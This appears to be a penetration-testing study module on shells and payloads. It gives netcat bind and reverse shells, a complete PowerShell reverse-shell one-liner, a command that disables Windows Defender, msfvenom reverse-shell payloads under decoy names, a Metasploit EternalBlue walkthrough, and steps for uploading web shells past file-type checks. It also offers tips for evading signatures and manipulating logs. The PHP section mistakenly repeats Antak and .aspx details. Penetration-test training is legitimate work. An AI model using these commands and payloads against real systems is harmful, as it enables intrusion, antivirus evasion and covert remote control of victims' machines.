# 🐚 Shells & Payloads  
*Delve into the forbidden arts of initial compromise, where whispers in the void become footholds in vulnerable hosts. This module equips the practitioner with eldritch techniques to summon shells and craft payloads—essential rites in breaching the veil between attacker and target, be they Windows or Linux systems.*

> *“To speak with the machine, one must first teach it to listen.”*

<details>
<summary><h1>📌 Shell Basics</h1></summary>

<details>  
<summary><h2>⏩ Bind Shells</h2></summary>

<details>
<summary><h3>Basic Bind Shell with Netcat</h3></summary>  

**Target Machine: Starting Netcat listener**  

```bash
nc -lvnp <PORT>
```

**Attack Machine: Connecting to target**  

```bash
nc -nv <IP> <PORT>
```

> **NOTE:**  Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

</details>

<details>
<summary><h3>Establishing a Basic Bind Shell with Netcat</h3></summary>  

**Target Machine: Starting Netcat listener**  

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <PORT> > /tmp/f
```  

**Attack Machine: Starting Netcat listener**  

```bash
nc -nv <IP> <PORT>
```

> **NOTE:**  Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical.

</details>

</details>

<details>  
<summary><h2>⏪ Reverse Shells</h2></summary>
<details>
<summary><h3>Basic Reverse Shell with Netcat</h3></summary>  

**Attack Machine: Starting a listener**  

```bash
sudo nc -lvnp <PORT>
```

**Target Machine(Windows - CMD): Connect to the Attack Machine**  
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

If you get an error like this one:  
```cmd
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
+ CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+ FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Disable the antivirus using Powershell
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Re-run the CMD command.

</details>
</details>

</details>

<details>
<summary><h1>📦 Payloads</h1></summary>
<details>
<summary><h3>Metasploit - Example</h3></summary>  

```bash
sudo msfconsole
```

**Inside the MSF Console**  

Searching Within Metasploit  

```bash
msf6 > search smb
```

Selecting an Exploit  

```bash
msf6 > use 56
```

Examining an Exploit's Options  

```bash
msf6 > options
```

Setting Options  

```bash
msf6 > set RHOSTS <TARGET IP>
msf6 > set SMBUser <USER>
msf6 > set SMBPass <PASSWORD>
msf6 > set LHOST <ATTACKER IP>
msf6 > set LPORT <ATTACKER PORT>
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
```

Exploits Away  

```bash
msf6 > run

# [*] Meterpreter session 1 opened (<ATTACKER IP>:<ATTACKER PORT> -> <TARGET IP>:<TARGET PORT>) at 2025-06-20 10:56:44 -0500

# (Meterpreter 1)(C:\Windows\system32) > 
```

</details>
<details>
<summary><h3>Crafting payloads with MSFvenom</h3></summary>  

**Attack Machine: List Payloads** 

```bash
msfvenom -l payloads
```

**Attack Machine: Building A Stageless Payload** 

```bash
msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -f <FILE FORMAT> > <OUTPUT FILE>
```

Examples:  

> **Linux:** msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

> **Windows:** msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > GTA_SA.exe  

**Target Machine: Download and execute** 

There are countless ways this can be done. Here are just some of the common ways:

> Email message with the file attached.  

> Download link on a website.  

> Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).  

> Via flash drive as part of an onsite penetration test.  

The payload in this form would almost certainly be detected by Windows Defender AV.


</details>
</details>


<details>
<summary><h1>🪟 Windows Shells</h1></summary>  
<details>
<summary><h3>Infiltrating Windows</h3></summary>  
<details>
<summary><h4>Enumerating Windows & Fingerprinting Methods</h4></summary>  

When performing ICMP-based host discovery, Windows systems typically respond with one of these ICMP reply codes:

* Code 128: Standard response (most common)

* Code 32: Alternate response variant

These reply codes serve as reliable indicators of an active Windows host when conducting ping sweeps or network reconnaissance.  

**Attack Machine:** Ping target
```bash
ping <TARGET IP> (<TARGET IP>): 56 data bytes
64 bytes from <TARGET IP>: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from <TARGET IP>: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from <TARGET IP>: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from <TARGET IP>: icmp_seq=3 ttl=128 time=11.265 ms
```

**Attack Machine:** Initialize an OS Identification scan against our target  

```bash
sudo nmap -v -O <TARGET IP>
```

**Attack Machine:** For each port Nmap sees as up, it will attempt to connect to the port and glean any information it can from it.  

```bash
sudo nmap -v <TARGET IP> --script banner.nse
```

> The examples shown above are just a few ways to help fingerprint and determine if a host is a Windows machine. It is by no means an exhaustive list, and there are many other checks you can do.

</details>

<details>
<summary><h4>Payload Types to Consider</h4></summary>

**DLLs:** Dynamic Link Libraries (DLLs) are shared resource files in Microsoft Windows that allow multiple programs to access common code and data simultaneously. Attackers can exploit these files by either injecting a malicious DLL or hijacking a vulnerable system library, enabling privilege escalation to SYSTEM level or bypassing User Account Control (UAC) security measures.

**Batch:** Text-based DOS scripts used by system administrators to automate multiple tasks through the command-line interpreter (CLI).

**VBS:** A lightweight scripting language derived from Microsoft’s Visual Basic. While historically used for client-side web scripting to enable dynamic content, modern browsers have largely deprecated VBS due to security concerns.

Primarily observed in:

* Phishing campaigns (e.g., malicious macros in Office documents)

* Social engineering attacks (e.g., tricking users to enable script execution)

* Legacy system maintenance (rare edge cases)

> **Security ** Execution typically requires explicit user interaction (e.g., enabling macros, clicking embedded objects).

**MSI:** MSI files contain installation instructions and components for Windows applications. Attackers can exploit this system by:

1. Creating malicious MSI packages containing payloads

2. Delivering them to target systems

3. Executing them via the Windows Installer service (msiexec.exe)

This technique can provide:

* Elevated privileges (often SYSTEM-level access)

* Persistent reverse shells

* Bypass of some security controls

**Powershell:** PowerShell serves as both an interactive shell and powerful scripting language, offering extensive capabilities for offensive security operations:

Key Advantages:

* Native Windows integration (no additional dependencies)

* Deep system access (Windows Management Instrumentation, .NET integration)

* Flexible in-memory execution (evades disk-based detection)

</details>

<details>
<summary><h4>Procedures for Payload Generation, Transfer, and Execution</h4></summary>

* [MSFVenom & Metasploit-Framework](https://github.com/rapid7/metasploit-framework): MSF stands as an indispensable tool for penetration testers, offering exceptional versatility across all stages of security assessments. This comprehensive platform enables professionals to conduct host enumeration, craft customized payloads, deploy both public and private exploits, and execute sophisticated post-exploitation activities.

* [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings): Here, you can find many different resources and cheat sheets for payload generation and general methodology.

* [Mythic C2 Framework](https://github.com/its-a-feature/Mythic): Alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.

* [Nishang](https://github.com/samratashok/nishang): Framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.

* [Darkarmour](https://github.com/bats3c/darkarmour): Tool to generate and utilize obfuscated binaries for use against Windows hosts.

</details>
</details>

<details>
<summary><h3>Example Compromise Walkthrough</h3></summary>

**Attack Machine: Enumerate the host**  

```bash
sudo nmap -n -Pn -sS -T4 -sV -sC -A -O --min-rate 5000 <TARGET IP> -oX nmap_target_xml_scan.xml
xsltproc nmap_target_xml_scan.xml -o nmap_target_html_scan.html
```

**Attack Machine: Start Metasploit**  

Open msfconsole and search for the for the identified service.

```bash
msfconsole
```

**Attack Machine: Determine if the targert is vulnerable** 

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010 
msf6 > show options
msf6 > set RHOSTS <TARGET IP>
msf6 > run
```
```bash
# [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_ms17_010) >> run

# [+] <TARGET IP>:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
# [*] <TARGET IP>:445       - Scanned 1 of 1 hosts (100% complete)
# [*] Auxiliary module execution completed
```

The vulnerability assessment indicates a high probability of an EternalBlue exploit working against our target. We'll proceed with configuring the exploit module and payload before initiating the attack.

**Attack Machine: Choose & Configure Our Exploit & Payload**

```bash
msf6 > search eternal
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 > options
msf6 > set LHOST <ATTACKER IP>
msf6 > set RHOSTS <TARGET IP>
```

Based on prior success rates with the PsExec variant, we'll prioritize this exploit method for initial execution. For this engagement, we've selected a standard Windows Meterpreter reverse TCP payload to maintain operational simplicity.

**Attack Machine: Execute Our Attack**  

```bash
msf6 > run
```
```bash
# [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run

# [*] Started reverse TCP handler on <ATTACKER IP>:4444 
# [*] <TARGET IP>:445 - Target OS: Windows Server 2016 Standard 14393
# [*] <TARGET IP>:445 - Built a write-what-where primitive...
# [+] <TARGET IP>:445 - Overwrite complete... SYSTEM session obtained!
# [*] <TARGET IP>:445 - Selecting PowerShell target
# [*] <TARGET IP>:445 - Executing the payload...
# [+] <TARGET IP>:445 - Service start timed out, OK if running a command or non-service executable...
# [*] Sending stage (175174 bytes) to <TARGET IP>
# [*] Meterpreter session 1 opened (<ATTACKER IP>:4444 -> <TARGET IP>:49672) at 2025-06-24 13:13:34 -0400

# (Meterpreter 1)(C:\Windows\system32) > 
```

With an active Meterpreter session established (indicated by the meterpreter > prompt), we now have multiple interaction options.

**Attack Machine: Verify Our Session**  

```bash
getuid
```
```bash
# Server username: NT AUTHORITY\SYSTEM
```

From here, we can utilize Meterpreter to run further commands to gather system information, steal user credentials, or use another post-exploitation module against the host.


**Attack Machine: Identify Our Shell**  
```bash
shell
```
```bash
# Process 4844 created.
# Channel 1 created.
# Microsoft Windows [Version 10.0.14393]
# (c) 2016 Microsoft Corporation. All rights reserved.

# C:\Windows\system32>
```

When we executed the Meterpreter command shell, it started another process on the host and dropped us into a system shell.

</details>

<details>
<summary><h3>CMD or PowerShell</h3></summary>

<details>
<summary><h4>Differences</h4></summary>

# CMD vs PowerShell Comparison

| Feature          | CMD                              | PowerShell                      |
|------------------|----------------------------------|---------------------------------|
| **Origin**       | Original MS-DOS shell            | Designed to expand CMD's capabilities |
| **Command Language** | Native MS-DOS commands (`dir`, `ipconfig`) | Supports both MS-DOS and **.NET cmdlets** (`Get-ChildItem`, `Copy-Item`) |
| **Input/Output** | Text-based                       | **.NET objects** (structured data) |
| **Scripting**    | Basic batch files (`.bat`, `.cmd`) | Advanced scripts (`.ps1`) with loops, modules, and functions |
| **Command History** | **No** session logging | Keeps history of executed commands |
| **Security**     | No Execution Policy restrictions | Restricted by **Execution Policy** (e.g., `Restricted`, `RemoteSigned`) and UAC |
| **Availability** | Works on **all Windows versions** | Only available on **Windows 7+** |
| **Extensibility** | Limited to built-in commands | Supports **custom modules** and cmdlets |


</details>

<details>
<summary><h4>Which one is the right one to use?</h4></summary>

**Use CMD when:**

* You are on an older host that may not include PowerShell.

* When you only require simple interactions/access to the host.

* When you plan to use simple batch files, net commands, or MS-DOS native tools.

* When you believe that execution policies may affect your ability to run scripts or other actions on the host.

**Use PowerShell when:**

* You are planning to utilize cmdlets or other custom-built scripts.

* When you wish to interact with .NET objects instead of text output.

* When being stealthy is of lesser concern.

* If you are planning to interact with cloud-based services and hosts.

* If your scripts set and use Aliases.

</details>

</details>
</details>

<details>
<summary><h1>🐧 Linux/UNIX Shells</h1></summary>  
<details>
<summary><h2>Infiltrating Linux/UNIX</h2></summary>  

**Attack Machine: Enumerate the host**  

```bash
sudo nmap -sS -sV -sC -v -A -O <TARGET IP> --script banner.nse -oX nmap_target_xml_scan.xml

xsltproc nmap_target_xml_scan.xml -o nmap_target_html_scan.html
```

**Attack Machine: Start Metasploit**  

Open msfconsole and search for the for the identified service.

```bash
msfconsole
```

**Attack Machine: Determine an Exploit Path**  

```bash
msf6 > search rconfig
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

**Attack Machine: Configure Exploit Options**  

```bash
msf6 > options
msf6 > set RHOSTS <TARGET IP>
msf6 > set LHOST <ATTACKER IP>
```

**Attack Machine: Execute the Exploit**  
```bash
msf6 > exploit
```

**Attack Machine: Interact With the Shell**  
```bash
shell
```

**Attack Machine: Interact With the Shell**  
```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
```

</details>

<details>
<summary><h2>Spawning Interactive Shells</h2></summary>  

<details>
<summary><h3>Spawn a shell</h3></summary>  

When encountering systems with restricted shell access and no Python interpreter, we should be prepared with alternative methods to escalate to an interactive shell. Several reliable techniques exist for this common post-exploitation scenario:

**/bin/sh**

This command will execute the shell interpreter specified in the path in interactive mode (-i).

```bash
/bin/sh -i
# sh: no job control in this shell
```

**Perl**

If the programming language Perl is present on the system, these commands will execute the shell interpreter specified.

```bash
perl —e 'exec "/bin/sh";'
```

```bash
perl: exec "/bin/sh";\
# This command should be run from a script.
```

**Ruby**

When Ruby is available on a target system, the following command can execute a system shell:

```bash
ruby: exec "/bin/sh"
# This command should be run from a script.
```

**Lua**

When Lua is available on a target system, the os.execute() function can be leveraged to spawn system shells. The most reliable approach uses absolute paths to avoid dependency on environment variables:

```bash
lua: os.execute('/bin/sh')
# This command should be run from a script.
```

**AWK**

AWK is a powerful pattern scanning and processing language with C-like syntax, commonly available on UNIX/Linux systems. AWK also provides functionality that can be leveraged to establish interactive shell sessions in security contexts.

```bash
awk 'BEGIN {system("/bin/sh")}'
```

**Find**

Find is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria.

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

**Exec**

The find command's -exec parameter can directly invoke a shell interpreter, but this method is contingent on locating the specified file - if the search fails, no shell session will be established.

```bash
find . -exec /bin/sh \; -quit
```

**VIM**

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor VIM. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.

Vim To Shell  

```bash
vim -c ':!/bin/sh'
```

Vim Escape  
```bash
vim
:set shell=/bin/sh
:shell
```

</details>

<details>
<summary><h4>Execution Permissions</h4></summary>  

Permissions
```bash
ls -la <PATH>
```

Sudo
```bash
sudo -l
```

> Not only will considering permissions allow us to see what commands we can execute, but it may also start to give us an idea of potential vectors that will allow us to escalate privileges.

</details>

</details>

</details>

<details>
<summary><h1>🌐 Web Shells</h1></summary>  

A web shell provides browser-based command execution on a web server's underlying operating system, frequently serving as the initial persistence mechanism in web application attacks. This foothold often enables subsequent upgrades to fully interactive reverse shells.

In external penetration testing engagements, the most prevalent initial access vectors include:

* Web application vulnerabilities (file upload flaws, SQL injection, RFI/LFI, command injection)

* Credential-based attacks against exposed services (RDS, VPN portals, Citrix, OWA) leveraging Active Directory authentication

* Social engineering campaigns

Web applications typically constitute the largest exposed attack surface during external assessments. Common findings include unsecured file upload functionality accepting malicious PHP, JSP, or ASP.NET web shells.

<details>
<summary><h2>Laudanum</h2></summary>  

Laudanum is a curated collection of pre-built injection files designed for web application penetration testing. This repository provides security professionals with:

**Key Capabilities:**

* Immediate reverse shell establishment

* Browser-based command execution on compromised hosts

* Cross-language support (ASP, ASPX, JSP, PHP, etc.)

**Operational Value:**

* Rapid deployment during security assessments

* Multiple language support for diverse web environments

* Pre-tested payloads reducing setup time

<details>
<summary><h3>Installation</h3></summary>  

**Clone the repository**  

```bash
sudo git clone https://github.com/jbarcia/Web-Shells.git /usr/share/laudanum
```

</details>

<details>
<summary><h3>Usage</h3></summary>  

The Laudanum toolkit is typically pre-installed at the following location:

```bash
/usr/share/laudanum
```

For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run.

**Move a Copy for Modification**
```bash
cp /usr/share/laudanum/aspx/shell.aspx ./shell.aspx
```

**Modify the Shell for Use**

Add your IP address to the allowedIps variable

```bash
nano ./shell.aspx
```

**Upload the shell**  

We are taking advantage of the upload function of the page. Select your shell file and hit upload.

**Navigate to Our Shell**  

You may run into some implementations that randomize filenames on upload that do not have a public files directory or any number of other potential safeguards.
With this particular web application, our file went to _URL\\files\shell.aspx_ and will require us to browse for the upload by using that \ in the path instead of the / like normal.

**Shell Success** 

We can now utilize the Laudanum shell we uploaded to issue commands to the host.

</details>

</details>

<details>
<summary><h2>Antak Webshell</h2></summary>  

Antak is an ASP.NET web shell included in the Nishang framework, an offensive PowerShell toolkit designed for penetration testing across all engagement phases.

**Key Features:**

* PowerShell Integration: Executes commands directly via PowerShell, ideal for Windows server exploitation

* User Interface: PowerShell-themed UI for seamless interaction

* Operational Flexibility: Supports post-exploitation activities within compromised environments

**Advantages in Engagements:**

* Native compatibility with Windows environments

* Leverages PowerShell’s extensive system access

* Maintains low visibility when properly configured

<details>
<summary><h3>Installation</h3></summary>  

The Antak script can be found at the following location:

```bash
/usr/share/nishang/Antak-WebShell
```

Or in this [file](../scripts/shells/antak.aspx) included in this repository.

**Clone the complete nishang repository**
```bash
sudo git clone https://github.com/samratashok/nishang.git /usr/share/nishang/
```

</details>

<details>
<summary><h3>Usage</h3></summary>  

**Move a Copy for Modification**
```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx ./shell.aspx
```

**Modify the Shell for Use**

Always configure authentication credentials for your web shell to prevent unauthorized access.

> **NOTE:**  It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.

```bash
nano ./shell.aspx
```

**Upload the shell**  

We are taking advantage of the upload function of the page. Select your shell file and hit upload.

**Navigate to Our Shell**  

During file upload exploitation, you may encounter various security measures:

* Randomized filenames

* Non-public upload directories

* Other application-specific protections

Current Engagement Specifics:  

The uploaded web shell (shell.aspx) is accessible at:

```bash
URL\files\shell.aspx
```

> **NOTE:**  This path requires Windows-style backslashes (\) rather than standard forward slashes (/).

**Shell Success** 

We can now utilize the antak shell we uploaded to issue commands to the host.

</details>

</details>

<details>
<summary><h2>PHP Web Shells</h2></summary>  

We will be using [WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/tree/master). We can download this or copy and paste the source code into a .php file.

<details>
<summary><h3>Installation</h3></summary>  

The script can be found [here](../scripts/shells/webshell.php) or cloning WhiteWinterWolf's [repository](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/tree/master).

**Clone the complete nishang repository**  

```bash
sudo git clone https://github.com/WhiteWinterWolf/wwwolf-php-webshell.git /usr/share/wwwolf-php-webshell/
```

</details>

<details>
<summary><h3>Usage</h3></summary>  

**Proxy Settings**

To intercept web traffic through Burp Suite:

1. Launch Burp Suite

    * Ensure the proxy listener is active (default: 127.0.0.1:8080)

2. Configure Browser Proxy Settings

    * Navigate to your browser's network/proxy configuration

    * Enter the following values:

    ```bash
    IP Address/Host: 127.0.0.1  
    Port: 8080
    ```

    * Disable any SSL/TLS verification warnings (for testing environments only)

3. Verification

    * Visit any HTTP page to confirm traffic appears in Burp's Proxy → Intercept tab

> **NOTE:**  Our goal is to change the content-type to bypass the file type restriction in uploading files to be "presented" as something else so we can navigate to that file and have our web shell.

**Bypassing the File Type Restriction**  

To circumvent file type restrictions, we'll manipulate the Content-Type header:

1. Header Modification

    * Change Content-Type: application/x-php → Content-Type: image/gif

    * This exploits potential server-side validation flaws

2. Execution

    * After modification, select Forward in Burp Suite

    * The server may now accept the .php file due to mismatched MIME verification

3. Considerations

    * Effectiveness depends on server validation methods

    * Works against filters checking only Content-Type (not file signatures)

    * Often combined with filename obfuscation (e.g., shell.php.gif)

**Upload the shell**  

We are taking advantage of the upload function of the page. Select your shell file and hit upload.

**Navigate to Our Shell**  

During file upload exploitation, you may encounter various security measures:

* Randomized filenames

* Non-public upload directories

* Other application-specific protections

Current Engagement Specifics:  

The uploaded web shell (shell.aspx) is accessible at:

```bash
URL\files\shell.aspx
```

**Shell Success** 

We can now utilize the antak shell we uploaded to issue commands to the host.

</details>

</details>

<details>
<summary><h2>Considerations when Dealing with Web Shells
</h2></summary>  

When employing web shells during engagements, testers should account for the following challenges:

1. Persistence Limitations

    * Automated file cleanup processes may remove deployed shells after a set duration

2. Functional Constraints

    * Restricted OS interaction (e.g., limited file system navigation)

    * Command chaining failures (e.g., whoami && hostname may not execute properly)

    * Reduced stability in non-interactive environments

3. Forensic Footprint

    * Higher likelihood of leaving detectable artifacts (logs, files, etc.)

**Engagement-Specific Tradecraft**  

For black box or evasive assessments:

* Prioritize stealth techniques to avoid detection

* Mirror realistic adversary tradecraft, including:

    * Log manipulation

    * Timed execution to blend with normal traffic

    * Use of encrypted or obfuscated channels

* Balance operational security with testing objectives to properly evaluate the client's detection capabilities

</details>

</details>

---

📘 **Next step:** Continue with [METASPLOIT FRAMEWORK](./06-metasploit-framework.md)
